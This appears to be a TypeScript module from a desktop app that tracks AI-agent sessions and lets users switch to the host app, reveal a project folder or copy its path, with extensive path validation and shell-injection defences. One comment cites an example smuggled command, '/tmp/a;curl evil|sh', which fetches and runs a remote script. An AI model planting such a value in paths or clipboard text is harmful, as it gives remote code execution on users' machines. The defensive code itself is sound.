import { execFile } from 'node:child_process'
import path from 'node:path'
import type { AgentStatusEvent } from '../src/types/agent'
import { windowsExecutablesFor, type HostAppId } from '../src/types/host-app.ts'
import type { SessionJumpAction, SessionJumpResult } from '../src/types/session-jump'
import { isValidBundleId, parseHostHints, resolveHostBundleId } from './host-app.ts'
import { SlidingWindowLimiter } from './sliding-window-limiter.ts'
import type { WindowsActivationResult } from './windows-window-activator.ts'
import { asRecord } from './value-guards.ts'
import { SESSION_REMOVE_MS } from '../src/utils/session-lifecycle.ts'

// Project path and bundle id stay in main-process memory only; the renderer names a session by source + session id.
// Trust boundary: hook events and generic /v1/events callers share one token, so a token holder can pose as a hook.
// Nothing here relies on the event being "really" from a hook: only allowlisted apps can be activated,
// every action needs a user click, and folders are only revealed (never opened).

const MAX_ENTRIES = 200
const MAX_AGE_MS = SESSION_REMOVE_MS
const MAX_PATH_LENGTH = 4096
const RATE_WINDOW_MS = 10_000
const RATE_LIMIT_PER_ACTION = 5
const CONTROL_CHARACTERS = /[\u0000-\u001f\u007f]/
// Document packages such as .xcodeproj are covered by the reveal-only behaviour, not by this list.
const MAC_PACKAGE_EXTENSIONS: ReadonlySet<string> = new Set([
  '.app', '.appex', '.action', '.bundle', '.component', '.driver', '.framework', '.kext', '.mdimporter', '.mpkg',
  '.pkg', '.plugin', '.prefpane', '.qlgenerator', '.saver', '.systemextension', '.wdgt', '.workflow', '.xpc',
])

export interface SessionJumpContext {
  /** Raw `project` (cwd) string from the event; validated before any use. */
  projectPath?: string
  bundleId?: string
}

interface JumpEntry {
  adapterId?: string
  app?: HostAppId
  bundleId?: string
  projectPath?: string
  lastSeenAt: number
}

export interface DirectoryStat {
  isDirectory(): boolean
}

export interface SessionJumpDependencies {
  platform: NodeJS.Platform
  now?: () => number
  getPreferences(): { sessionJumpEnabled: boolean; sessionJumpSwitchAppEnabled: boolean }
  activateBundle(bundleId: string): Promise<void>
  /** 未提供時 win32 視為不支援。 */
  activateWindowsApp?(executables: ReadonlyArray<string>): Promise<WindowsActivationResult>
  // Never "opens": LaunchServices treats document packages (.xcodeproj, .rtfd, ...) as documents and would launch
  // their app with attacker-chosen content.
  revealDirectory(directory: string): void
  writeClipboard(text: string): void
  realpath(target: string): Promise<string>
  stat(target: string): Promise<DirectoryStat>
  exists(target: string): Promise<boolean>
}

const OPEN_TIMEOUT_MS = 5_000
const OPEN_EXECUTABLE = '/usr/bin/open'

export type ExecFileLike = (
  file: string,
  args: ReadonlyArray<string>,
  options: { timeout: number; shell: false },
  callback: (error: Error | null) => void,
) => unknown

// No Apple Event is sent, so no Automation or Accessibility permission (and no system prompt) is needed.
export function activateMacBundle(bundleId: string, run: ExecFileLike = execFile as unknown as ExecFileLike): Promise<void> {
  if (!isValidBundleId(bundleId)) return Promise.reject(new Error('invalid bundle id'))
  return new Promise((resolve, reject) => {
    run(OPEN_EXECUTABLE, ['-b', bundleId], { timeout: OPEN_TIMEOUT_MS, shell: false }, error => {
      if (error) reject(error)
      else resolve()
    })
  })
}

export function sessionJumpKey(source: string, sessionId: string): string {
  return `${source}:${sessionId}`
}

function pathApi(platform: NodeJS.Platform): path.PlatformPath {
  return platform === 'win32' ? path.win32 : path.posix
}

export function isUsableProjectPath(value: unknown, platform: NodeJS.Platform): value is string {
  if (typeof value !== 'string' || value.length === 0 || value.length > MAX_PATH_LENGTH) return false
  if (CONTROL_CHARACTERS.test(value)) return false
  if (!pathApi(platform).isAbsolute(value)) return false
  // UNC and device paths would make Explorer contact a remote host (and send credentials).
  if (platform === 'win32' && /^[\\/]{2}/.test(value)) return false
  // 只收「磁碟機代號 + 絕對路徑」：排除 `\??\` 前綴與 NTFS 替代資料流 `a:stream`。
  if (platform === 'win32' && (!/^[A-Za-z]:[\\/]/.test(value) || value.indexOf(':', 2) !== -1)) return false
  return true
}

// Backslash is an escape in POSIX shells but the separator on Windows, where cmd's % and ^ are refused instead.
const POSIX_SHELL_METACHARACTERS = /[;|&$`<>(){}*?!"'\\]|\s#/
// PowerShell 也把彎引號（U+2018-201F）當成引號；`[` `]` 在 PowerShell 是萬用字元；空白後的 `#` 會開始註解。
const WINDOWS_SHELL_METACHARACTERS = /[;|&$`<>(){}*?!"'%^\u2018-\u201f[\]]|\s#/

export function isShellSafePath(value: string, platform: NodeJS.Platform): boolean {
  if (CONTROL_CHARACTERS.test(value)) return false
  return !(platform === 'win32' ? WINDOWS_SHELL_METACHARACTERS : POSIX_SHELL_METACHARACTERS).test(value)
}

export async function verifyProjectDirectory(
  value: unknown,
  deps: Pick<SessionJumpDependencies, 'platform' | 'realpath' | 'stat' | 'exists'>,
): Promise<string | null> {
  if (!isUsableProjectPath(value, deps.platform)) return null
  let real: string
  try {
    real = await deps.realpath(value)
  } catch {
    return null
  }
  // realpath resolved every link; check the result again (a link may point at a UNC share).
  if (!isUsableProjectPath(real, deps.platform)) return null
  try {
    if (!(await deps.stat(real)).isDirectory()) return null
  } catch {
    return null
  }
  const api = pathApi(deps.platform)
  if (deps.platform === 'darwin') {
    if (MAC_PACKAGE_EXTENSIONS.has(api.extname(real).toLowerCase())) return null
    if (await deps.exists(api.join(real, 'Contents', 'Info.plist'))) return null
  }
  // Shell namespace junctions ("name.{CLSID}") open a shell extension, not a folder; refused at any level, not just the last.
  if (deps.platform === 'win32' && /\.\{[0-9a-f-]+\}(?:[\\/]|$)/i.test(real)) return null
  return real
}

export class SessionJumpService {
  private readonly entries = new Map<string, JumpEntry>()
  private readonly limiters = new Map<SessionJumpAction, SlidingWindowLimiter>()
  private readonly now: () => number
  private readonly deps: SessionJumpDependencies

  constructor(deps: SessionJumpDependencies) {
    this.deps = deps
    this.now = deps.now ?? Date.now
  }

  record(event: AgentStatusEvent, context?: SessionJumpContext): void {
    if (event.originalEvent === 'AgentPetsIntegrationTest') return
    const key = sessionJumpKey(event.source, event.sessionId)
    if (event.state === 'offline') {
      this.entries.delete(key)
      return
    }
    const previous = this.entries.get(key)
    const reportedPath = context?.projectPath
    const projectPath = isUsableProjectPath(reportedPath, this.deps.platform) ? reportedPath : previous?.projectPath
    const app = event.host?.app ?? previous?.app
    const bundleId = event.host ? context?.bundleId : previous?.bundleId
    this.entries.delete(key)
    this.entries.set(key, {
      ...(event.adapterId ? { adapterId: event.adapterId } : {}),
      ...(app ? { app } : {}),
      ...(bundleId ? { bundleId } : {}),
      ...(projectPath ? { projectPath } : {}),
      lastSeenAt: this.now(),
    })
    while (this.entries.size > MAX_ENTRIES) this.entries.delete(this.entries.keys().next().value as string)
  }

  clear(): void {
    this.entries.clear()
  }

  switchTarget(key: string): string | null {
    if (this.deps.platform !== 'darwin' && this.deps.platform !== 'win32') return null
    const entry = this.entry(key)
    // Defence in depth only: a token holder can still claim a built-in source; the allowlist in resolveHostBundleId is the real boundary.
    if (!entry || !entry.adapterId || entry.adapterId === 'generic-http') return null
    if (this.deps.platform === 'win32') return windowsExecutablesFor(entry.app).length > 0 ? entry.app ?? null : null
    return resolveHostBundleId(entry.app, entry.bundleId)
  }

  // Returns false (the caller opens the Sessions tab instead) whenever it did not switch.
  async switchFromNotification(target: { source: string; sessionId: string }): Promise<boolean> {
    const key = sessionJumpKey(target.source, target.sessionId)
    if (!this.switchTarget(key)) return false
    return (await this.run('switch-app', key)).ok
  }

  async run(action: SessionJumpAction, key: string): Promise<SessionJumpResult> {
    const preferences = this.deps.getPreferences()
    if (!preferences.sessionJumpEnabled) return { ok: false, error: 'disabled' }
    if (action === 'switch-app' && !preferences.sessionJumpSwitchAppEnabled) return { ok: false, error: 'disabled' }
    if (!this.take(action)) return { ok: false, error: 'rate_limited' }
    const entry = this.entry(key)
    if (!entry) return { ok: false, error: 'unknown_session' }

    switch (action) {
      case 'switch-app': {
        if (this.deps.platform === 'win32') return this.switchWindowsApp(key, entry)
        if (this.deps.platform !== 'darwin') return { ok: false, error: 'unsupported' }
        const bundleId = this.switchTarget(key)
        if (!bundleId) return { ok: false, error: 'unavailable' }
        try {
          await this.deps.activateBundle(bundleId)
          return { ok: true }
        } catch {
          return { ok: false, error: 'failed' }
        }
      }
      case 'show-folder': {
        const directory = await verifyProjectDirectory(entry.projectPath, this.deps)
        if (!directory) return { ok: false, error: 'unavailable' }
        try {
          this.deps.revealDirectory(directory)
          return { ok: true }
        } catch {
          return { ok: false, error: 'failed' }
        }
      }
      case 'copy-path': {
        // The user pastes this without seeing it, often into a shell: only a shell-safe, existing, non-bundle
        // directory reaches the clipboard, so a forged event cannot plant `/tmp/a;curl evil|sh`.
        const projectPath = entry.projectPath
        if (!projectPath || !isShellSafePath(projectPath, this.deps.platform)) return { ok: false, error: 'unavailable' }
        if (!(await verifyProjectDirectory(projectPath, this.deps))) return { ok: false, error: 'unavailable' }
        try {
          this.deps.writeClipboard(projectPath)
          return { ok: true }
        } catch {
          return { ok: false, error: 'failed' }
        }
      }
    }
  }

  private async switchWindowsApp(key: string, entry: JumpEntry): Promise<SessionJumpResult> {
    const activate = this.deps.activateWindowsApp
    if (!activate) return { ok: false, error: 'unsupported' }
    if (!this.switchTarget(key)) return { ok: false, error: 'unavailable' }
    try {
      const result = await activate(windowsExecutablesFor(entry.app))
      if (result === 'activated') return { ok: true }
      return { ok: false, error: result === 'not_found' ? 'unavailable' : 'failed' }
    } catch {
      return { ok: false, error: 'failed' }
    }
  }

  private entry(key: string): JumpEntry | undefined {
    const entry = this.entries.get(key)
    if (!entry) return undefined
    if (this.now() - entry.lastSeenAt > MAX_AGE_MS) {
      this.entries.delete(key)
      return undefined
    }
    return entry
  }

  private take(action: SessionJumpAction): boolean {
    let limiter = this.limiters.get(action)
    if (!limiter) {
      limiter = new SlidingWindowLimiter(RATE_WINDOW_MS, RATE_LIMIT_PER_ACTION)
      this.limiters.set(action, limiter)
    }
    return limiter.consume(this.now(), RATE_LIMIT_PER_ACTION).allowed
  }
}

// A WeakMap keyed by the event object never reaches a renderer (IPC clones the event's own fields only).
const contexts = new WeakMap<AgentStatusEvent, SessionJumpContext>()

function rawField(input: unknown, key: string): unknown {
  return asRecord(input)?.[key]
}

export function withSessionJumpContext(
  input: unknown,
  event: AgentStatusEvent,
  platform: NodeJS.Platform = process.platform,
): AgentStatusEvent {
  const bundleId = event.host ? parseHostHints(rawField(input, 'host'))?.bundleId : undefined
  const projectPath = rawField(input, 'project')
  const next = event.host
    ? {
        ...event,
        host: {
          kind: event.host.kind,
          app: event.host.app,
          switchable: event.adapterId !== undefined
            && event.adapterId !== 'generic-http'
            && (platform === 'darwin'
              ? resolveHostBundleId(event.host.app, bundleId) !== null
              : platform === 'win32' && windowsExecutablesFor(event.host.app).length > 0),
        },
      }
    : event
  contexts.set(next, {
    ...(typeof projectPath === 'string' ? { projectPath } : {}),
    ...(bundleId ? { bundleId } : {}),
  })
  return next
}

export function takeSessionJumpContext(event: AgentStatusEvent): SessionJumpContext | undefined {
  const context = contexts.get(event)
  contexts.delete(event)
  return context
}
